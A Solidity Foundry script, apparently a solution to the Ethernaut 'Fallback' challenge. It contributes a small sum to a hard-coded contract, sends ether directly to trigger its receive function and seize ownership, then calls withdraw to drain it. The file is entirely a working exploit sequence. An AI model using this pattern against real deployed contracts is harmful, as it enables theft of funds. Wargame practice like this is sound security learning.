// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {AttackFallback} from "../src/AttackFallback.sol";

contract FallbackScript is Script {
    
    
    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // AttackFallback attack = new AttackFallback();
        // vm.deal(address(attack),0.001 ether);

        // attack.contribute();
        // attack.sendEth();
        // attack.withdraw();

        // attack.get(payable(0xc8Bd59d60961bEdb12c95079250d3075b9328a2d));

        IExpose attack = IExpose(0xd7dbCDF0Efc84fD1362C626d75Ea7de74703AF23);

        // vm.deal(address(attack),0.001 ether);
        attack.contribute{value: 0.0001 ether}();
        attack.getContribution();

        // bacause,businecc logical in the receive(),if use send or transfer to send the ether,it will be out of gas.
        payable(0xd7dbCDF0Efc84fD1362C626d75Ea7de74703AF23).call{value: 0.00001 ether}("");
        attack.withdraw();

        vm.stopBroadcast();
    }
}

interface IExpose {
    function contribute() external payable;

    function getContribution() external view returns (uint);

    function withdraw() external;
}
